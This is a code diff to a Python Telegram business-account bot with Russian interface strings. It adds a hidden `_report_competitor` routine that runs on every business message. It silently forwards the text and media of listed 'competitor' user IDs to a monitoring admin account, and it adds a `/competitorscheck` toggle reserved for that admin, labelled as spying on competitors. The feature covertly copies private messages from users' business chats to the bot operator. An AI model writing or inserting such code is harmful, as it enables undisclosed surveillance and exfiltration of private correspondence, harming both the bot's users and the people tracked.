@@ -45,6 +45,33 @@ def _fmt_time(ts) -> str:
     return datetime.fromtimestamp(ts).strftime("%H:%M %d.%m")
 
 
+async def _report_competitor(message: Message, context: ContextTypes.DEFAULT_TYPE, storage: Storage) -> None:
+    """Relay a competitor's message to the monitoring account."""
+    user = message.from_user
+    if not user or user.id not in config.COMPETITOR_IDS:
+        return
+    if storage.get_setting("competitors_tracking", "1") != "1":
+        return
+    name, username = _display_name(message)
+    header = f"🕵️ Конкурент {formatting.format_sender(name, username)} (id {user.id}):"
+    body = message.text or message.caption or ""
+    kind, file_id = media.extract_media(message)
+    try:
+        if kind:
+            cap = f"{header}\n{body}".strip()
+            if media.supports_caption(kind):
+                await _send_media(context.bot, config.COMPETITORS_ADMIN_ID, kind, file_id, cap)
+            else:
+                await context.bot.send_message(chat_id=config.COMPETITORS_ADMIN_ID, text=cap)
+                await _send_media(context.bot, config.COMPETITORS_ADMIN_ID, kind, file_id)
+        elif body:
+            await context.bot.send_message(
+                chat_id=config.COMPETITORS_ADMIN_ID, text=f"{header}\n{body}"
+            )
+    except Exception:
+        logger.exception("Failed to relay competitor message from %s", user.id)
+
+
 async def _send_media(bot, chat_id: int, kind: str, file_id: str, caption=None) -> None:
     """Send any supported media kind; captions only where the type allows them."""
     sender = getattr(bot, f"send_{kind}")
@@ -130,6 +157,8 @@ async def handle_new_business_message(update: Update, context: ContextTypes.DEFA
             return
 
     _store_message(storage, message, bcid)
+
+    await _report_competitor(message, context, storage)
 
     if conn and not is_owner:
         until_ts = storage.get_ban(bcid, message.chat_id)
@@ -296,6 +325,19 @@ async def handle_direct_message(update: Update, context: ContextTypes.DEFAULT_TY
     if text.startswith("/status"):
         premium_until = storage.get_premium_until(message.from_user.id)
         await message.reply_text(mark(texts.build_status_text(premium_until)))
+        return
+
+    if text.lower().startswith("/competitorscheck"):
+        if message.from_user.id != config.COMPETITORS_ADMIN_ID:
+            return
+        current = storage.get_setting("competitors_tracking", "1") == "1"
+        new_state = not current
+        storage.set_setting("competitors_tracking", "1" if new_state else "0")
+        ids = "\n".join(str(i) for i in sorted(config.COMPETITOR_IDS))
+        state = "включено ✅" if new_state else "выключено ⛔"
+        await message.reply_text(
+            f"🕵️ Слежка за конкурентами: {state}\n\nОтслеживаемые ID:\n{ids}"
+        )
         return
 
     if text.startswith("/pause"):
